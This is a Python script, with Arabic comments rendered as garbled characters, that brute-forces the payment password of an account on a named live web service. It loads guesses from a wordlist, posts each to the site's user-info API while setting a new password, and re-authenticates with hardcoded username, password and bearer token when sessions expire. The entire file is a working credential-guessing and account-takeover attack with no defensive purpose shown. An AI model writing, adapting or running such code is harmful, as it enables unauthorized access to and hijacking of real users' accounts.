import requests
import threading
import time

# Ø¨ÙŠØ§Ù†Ø§Øª ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„ØªÙ‚Ø¯Ù…
progress = 0  # Ø¹Ø¯Ø¯ ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ù…Ø¬Ø±Ø¨Ø©
is_running = True  # Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©

# Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Ø§Ù„Ø·Ù„Ø¨Ø§Øª
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# Ø±Ø£Ø³ Ø§Ù„Ø·Ù„Ø¨Ø§Øª (Headers)
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',
}

# Ù‚Ø±Ø§Ø¡Ø© ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ù…Ù† Ù…Ù„Ù
def load_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            passwords = file.read().splitlines()
            print(f"âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ {len(passwords)} ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ù…Ù† {file_path}")
        return passwords
    except FileNotFoundError:
        print(f"âš ï¸ Ø§Ù„Ù…Ù„Ù {file_path} ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯.")
        return []

# Ø¯Ø§Ù„Ø© ØªØ¬Ø±Ø¨Ø© ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±
def try_passwords(passwords):
    global progress, is_running, token, headers

    if not passwords:
        print("âš ï¸ Ù„Ø§ ØªÙˆØ¬Ø¯ ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Ù„Ù„ØªØ¬Ø±Ø¨Ø©.")
        return

    while is_running and progress < len(passwords):
        password = passwords[progress]  # ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„ØªØ§Ù„ÙŠØ© Ù…Ù† Ø§Ù„Ù…Ù„Ù
        print(f"ğŸ”‘ ØªØ¬Ø±Ø¨Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø±Ù‚Ù… {progress + 1}: {password}")
        data = {
            'o_payword': password,
            'n_payword': '123123',
            'r_payword': '123123',
            'lang': 'eg',
            'token': token,
        }
        url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
        try:
            response = requests.post(url, json=data, headers=headers)
            response_json = response.json()

            # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù†ØªÙŠØ¬Ø© Ø§Ù„Ø·Ù„Ø¨
            if response_json.get("code") == 200:
                print(f"âœ… ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¨Ù†Ø¬Ø§Ø­ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù…: {password}")
                progress += 1  # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù… Ø¹Ù†Ø¯ Ø§Ù„Ù†Ø¬Ø§Ø­
            elif response_json.get("code") in [203, 204]:
                print("ğŸ”„ Ø§Ù†ØªÙ‡Øª Ø§Ù„Ø¬Ù„Ø³Ø©ØŒ Ø¥Ø¹Ø§Ø¯Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„...")
                relogin()  # Ø¥Ø¹Ø§Ø¯Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙˆØ§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØªÙˆÙƒÙ† Ø¬Ø¯ÙŠØ¯
            else:
                print(f"âš ï¸ ÙØ´Ù„ ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±. Ø§Ù„Ø±Ø¯: {response_json}")
                progress += 1  # Ø§Ù„ØªÙ‚Ø¯Ù… Ø¹Ù†Ø¯ Ø§Ù„ÙØ´Ù„ Ù„ØªØ¬Ù†Ø¨ ØªÙƒØ±Ø§Ø± Ù†ÙØ³ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©

        except requests.exceptions.RequestException as e:
            print(f"âš ï¸ Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨: {e}")
            time.sleep(5)

# Ø¯Ø§Ù„Ø© Ø¥Ø¹Ø§Ø¯Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
def relogin():
    global token, headers
    print("ğŸ”„ Ø¥Ø¹Ø§Ø¯Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØªÙˆÙƒÙ† Ø¬Ø¯ÙŠØ¯...")
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', json=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]
                headers['Authorization'] = f'Bearer {token}'  # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ù‡ÙŠØ¯Ø±
                print(f"âœ… ØªÙ… Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ø¬Ø¯ÙŠØ¯: {token}")
        else:
            print(f"âš ï¸ ÙØ´Ù„ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„. Ø§Ù„Ø±Ø¯: {response.json()}")
    except requests.exceptions.RequestException as e:
        print(f"âš ï¸ Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„: {e}")
        time.sleep(5)

# ØªØ­Ù…ÙŠÙ„ ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ù…Ù† Ø§Ù„Ù…Ù„Ù
passwords = load_passwords('passwordss.txt')

# Ø¨Ø¯Ø¡ ØªØ¬Ø±Ø¨Ø© ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙÙŠ Thread Ù…Ù†ÙØµÙ„
if passwords:
    threading.Thread(target=try_passwords, args=(passwords,), daemon=True).start()
    while progress < len(passwords):
        time.sleep(1)  # Ù…Ù†Ø¹ Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬ Ù‚Ø¨Ù„ Ø§ÙƒØªÙ…Ø§Ù„ Ø§Ù„ØªØ¬Ø±Ø¨Ø©
else:
    print("âš ï¸ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Ù„ØªØ¬Ø±Ø¨ØªÙ‡Ø§.")
